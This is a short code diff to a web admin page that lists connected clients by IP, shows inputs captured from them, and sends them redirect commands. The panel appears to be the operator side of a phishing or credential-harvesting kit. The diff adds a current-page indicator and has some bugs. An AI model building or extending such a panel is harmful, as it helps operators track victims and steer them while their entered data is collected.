@@ -32,7 +32,10 @@
         clientDiv.classList.add('client');
         const inputsHtml = Object.entries(client.inputs).map(([key, value]) => `<p>${key}: ${value}</p>`).join('');
         clientDiv.innerHTML = `
-          <h3>Client: ${client.clientId} IP: ${client.ip}</h3>
+          <div style="display:flex; align-items:center;">
+  <h3 style="margin-right: 10px;">Client: ${client.clientId} IP: ${client.ip}</h3>
+  <p class="currPage" id="currPage" style="background-color:green; width:10px; height:7px; margin: 0;"></p>
+</div> 
           <button onclick="sendCommand('${client.clientId}', 'redirect1')">Redirect 1</button>
           <button onclick="sendCommand('${client.clientId}', 'redirect2')">Redirect 2</button>
           <button onclick="viewInputs('${client.clientId}')">View Inputs</button>
@@ -46,6 +49,10 @@
       });
     }
 
+    function updateCurrPage(currPage){
+    document.getElementById('currPage').textContent = currPage;
+    }
+    
     async function sendCommand(clientId, command) {
       try {
         const response = await fetch('/send-command', {
@@ -92,6 +99,9 @@
       const data = JSON.parse(event.data);
       if (data.type === 'adminUpdate') {
         updateClients(data.clientList);
+        if(currPage){
+        updateCurrPage(data.currPage);
+        }
       }
     };
 
